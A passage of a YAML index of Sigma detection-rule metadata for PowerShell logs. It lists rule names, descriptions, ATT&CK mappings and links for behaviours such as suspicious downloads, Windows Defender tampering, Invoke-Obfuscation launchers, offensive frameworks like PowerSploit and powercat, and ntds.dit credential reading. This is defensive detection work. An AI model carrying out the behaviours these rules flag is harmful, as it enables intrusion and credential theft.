  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.003
  - T1059.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.001
  - attack.t1036.003
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml
  name: Suspicious PowerShell Download
  description: Detects suspicious PowerShell download command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html
  false_positives:
  - PowerShell scripts that download content from the Internet
  notes: ''
- detection_id: b366adb4-d63d-422d-8a2c-186463b5ded0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_susp_get_nettcpconnection.yml
  name: Use Get-NetTCPConnection
  description: Adversaries may attempt to get a listing of network connections to
    or from the compromised system they are currently accessing or from remote systems
    by querying for information over the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1049
  tags:
  - attack.discovery
  - attack.t1049
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell
  false_positives:
  - Unknown
  notes: ''
- detection_id: 71ff406e-b633-4989-96ec-bc49d825a412
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_susp_zip_compress.yml
  name: Zip A Folder With PowerShell For Staging In Temp - PowerShell
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: powershell-classic
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1074.001
  tags:
  - attack.collection
  - attack.t1074.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: ec19ebab-72dc-40e1-9728-4c0b805d722c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_tamper_windows_defender_set_mp.yml
  name: Tamper Windows Defender - PSClassic
  description: Attempting to disable scheduled scanning and other parts of Windows
    Defender ATP or set default actions to allow.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_classic_provider_start
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Legitimate PowerShell scripts that disable Windows Defender for troubleshooting
    purposes. Must be investigated.
  notes: ''
- detection_id: df9a0e0e-fedb-4d6c-8668-d765dfc92aa7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_wsman_com_provider_no_powershell.yml
  name: Suspicious Non PowerShell WSMAN COM Provider
  description: Detects suspicious use of the WSMAN provider without PowerShell.exe
    as the host application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: powershell-classic
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.003
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://twitter.com/chadtilbury/status/1275851297770610688
  - https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/
  - https://github.com/bohops/WSMan-WinRM
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74176142-4684-4d8a-8b0a-713257e7df8e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_active_directory_module_dll_import.yml
  name: Potential Active Directory Enumeration Using AD Module - PsModule
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  - Impact
  - Reconnaissance
  techniques: []
  tags:
  - attack.reconnaissance
  - attack.discovery
  - attack.impact
  time_window: ''
  references:
  - https://github.com/samratashok/ADModule
  - https://twitter.com/cyb3rops/status/1617108657166061568?s=20
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: 64e8e417-c19a-475a-8d19-98ea705394cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_alternate_powershell_hosts.yml
  name: Alternate PowerShell Hosts - PowerShell Module
  description: Detects alternate PowerShell hosts potentially bypassing detections
    looking for powershell.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190610-PwshAlternateHosts/notebook.html
  false_positives:
  - Programs using PowerShell directly without invocation of a dedicated interpreter
  - MSP Detection Searcher
  - Citrix ConfigSync.ps1
  notes: ''
- detection_id: 8d31a8ce-46b5-4dd6-bdc3-680931f1db86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_bad_opsec_artifacts.yml
  name: Bad Opsec Powershell Code Artifacts
  description: 'focuses on trivial artifacts observed in variants of prevalent offensive
    ps1 payloads, including

    Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other
    attack payloads

    that often undergo minimal changes by attackers due to bad opsec.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/
  - https://labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-high-value-targets/
  - https://www.mdeditor.tw/pl/pgRt
  false_positives:
  - Moderate-to-low; Despite the shorter length/lower entropy for some of these, because
    of high specificity, fp appears to be fairly limited in many environments.
  notes: ''
- detection_id: f99276ad-d122-4989-a09a-d00904a5f9d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_clear_powershell_history.yml
  name: Clear PowerShell History - PowerShell Module
  description: Detects keywords that could indicate clearing PowerShell history
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 1ddc1472-8e52-4f7d-9f11-eab14fc171f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_decompress_commands.yml
  name: PowerShell Decompress Commands
  description: A General detection for specific decompress commands in PowerShell
    logs. This could be an adversary decompressing files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/8
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/4.A.3_09F29912-8E93-461E-9E89-3F06F6763383.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41025fd7-0466-4650-a813-574aaacbe7f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_exploit_scripts.yml
  name: Malicious PowerShell Scripts - PoshModule
  description: Detects the execution of known offensive powershell scripts used for
    exploitation or reconnaissance
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/PowerShellMafia/PowerSploit
  - https://github.com/NetSPI/PowerUpSQL
  - https://github.com/CsEnox/EventViewer-UACBypass
  - https://web.archive.org/web/20210511204621/https://github.com/AlsidOfficial/WSUSpendu
  - https://github.com/nettitude/Invoke-PowerThIEf
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries
  - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1
  - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1
  - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1
  - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1
  - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
  - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/
  - https://github.com/HarmJ0y/DAMP
  - https://github.com/samratashok/nishang
  - https://github.com/DarkCoderSc/PowerRunAsSystem/
  - https://github.com/besimorhino/powercat
  - https://github.com/sadshade/veeam-creds/blob/6010eaf31ba41011b58d6af3950cffbf6f5cea32/Veeam-Get-Creds.ps1
  - https://github.com/The-Viper-One/Invoke-PowerDPAPI/
  - https://github.com/Arno0x/DNSExfiltrator/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b140afd9-474b-4072-958e-2ebb435abd68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_get_addbaccount.yml
  name: Suspicious Get-ADDBAccount Usage
  description: Detects suspicious invocation of the Get-ADDBAccount script that reads
    from a ntds.dit file and may be used to get access to credentials without using
    any credential dumpers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/
  - https://github.com/MichaelGrafnetter/DSInternals/blob/7ba59c12ee9a1cb430d7dc186a3366842dd612c8/Documentation/PowerShell/Get-ADDBAccount.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_get_clipboard.yml
  name: PowerShell Get Clipboard
  description: A General detection for the Get-Clipboard commands in PowerShell logs.
    This could be an adversary capturing clipboard contents.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/16
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/7.A.2_F4609F7E-C4DB-4327-91D4-59A58C962A02.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9fe55ea2-4cd6-4491-8a54-dd6871651b51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_hktl_evil_winrm_execution.yml
  name: HackTool - Evil-WinRm Execution - PowerShell Module
  description: 'Detects the execution of Evil-WinRM via PowerShell Module logs by
    leveraging the hardcoded strings inside the utility.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.lateral-movement
  time_window: ''
  references:
  - https://github.com/Hackplayers/evil-winrm/blob/7514b055d67ec19836e95c05bd63e7cc47c4c2aa/evil-winrm.rb
  - https://github.com/search?q=repo%3AHackplayers%2Fevil-winrm++shell.run%28&type=code
  false_positives:
  - Unknown
  notes: ''
- detection_id: a136cde0-61ad-4a61-9b82-8dc490e60dd2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_clip.yml
  name: Invoke-Obfuscation CLIP+ Launcher - PowerShell Module
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f211361-7dce-442d-b78a-c04039677378
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_obfuscated_iex.yml
  name: Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell Module
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block cited in the reference
    section below
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9ac8b09b-45de-4a07-9da1-0de8c09304a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_stdin.yml
  name: Invoke-Obfuscation STDIN+ Launcher - PowerShell Module
  description: Detects Obfuscated use of stdin to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_var.yml
  name: Invoke-Obfuscation VAR+ Launcher - PowerShell Module
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7034cbbb-cc55-4dc2-8dad-36c0b942e8f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_compress.yml
  name: Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell Module
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: a23791fe-8846-485a-b16b-ca691e1b03d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_rundll.yml
  name: Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell Module
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: c72aca44-8d52-45ad-8f81-f96c4d3c755e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_stdin.yml
  name: Invoke-Obfuscation Via Stdin - PowerShell Module
  description: Detects Obfuscated Powershell via Stdin in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: ebdf49d8-b89c-46c9-8fdf-2c308406f6bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_clip.yml
  name: Invoke-Obfuscation Via Use Clip - PowerShell Module
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_mhsta.yml
  name: Invoke-Obfuscation Via Use MSHTA - PowerShell Module
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88a22f69-62f9-4b8a-aa00-6b0212f2f05a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_rundll32.yml
  name: Invoke-Obfuscation Via Use Rundll32 - PowerShell Module
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_var.yml
  name: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell Module
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_malicious_commandlets.yml
  name: Malicious PowerShell Commandlets - PoshModule
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 12
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  - T1069
  - T1069.001
  - T1069.002
  - T1087
  - T1087.001
  - T1087.002
  - T1482
  tags:
  - attack.execution
  - attack.discovery
  - attack.t1482
  - attack.t1087
  - attack.t1087.001
  - attack.t1087.002
  - attack.t1069.001
  - attack.t1069.002
  - attack.t1069
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries
  - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1
  - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1
  - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1
  - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1
  - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
  - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/
  - https://github.com/calebstewart/CVE-2021-1675
  - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1
  - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html
  - https://github.com/HarmJ0y/DAMP
  - https://github.com/samratashok/nishang
  - https://github.com/DarkCoderSc/PowerRunAsSystem/
  - https://github.com/besimorhino/powercat
  - https://github.com/Kevin-Robertson/Powermad
  - https://github.com/adrecon/ADRecon
  - https://github.com/adrecon/AzureADRecon
  - https://github.com/sadshade/veeam-creds/blob/6010eaf31ba41011b58d6af3950cffbf6f5cea32/Veeam-Get-Creds.ps1
  - https://github.com/The-Viper-One/Invoke-PowerDPAPI/
  - https://github.com/Arno0x/DNSExfiltrator/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 96b9f619-aa91-478f-bacb-c3e50f8df575
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_remote_powershell_session.yml
  name: Remote PowerShell Session (PS Module)
  description: Detects remote PowerShell sessions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.006
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html
  false_positives:
  - Legitimate use remote PowerShell sessions
  notes: ''
- detection_id: 38a7625e-b2cb-485d-b83d-aff137d859f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_remotefxvgpudisablement_abuse.yml
  name: Potential RemoteFXvGPUDisablement.EXE Abuse - PowerShell Module
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 815bfc17-7fc6-4908-a55e-2f37b98cedb4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_ad_group_reco.yml
  name: AD Groups Or Users Enumeration Using PowerShell - PoshModule
  description: 'Adversaries may attempt to find domain-level groups and permission
    settings.

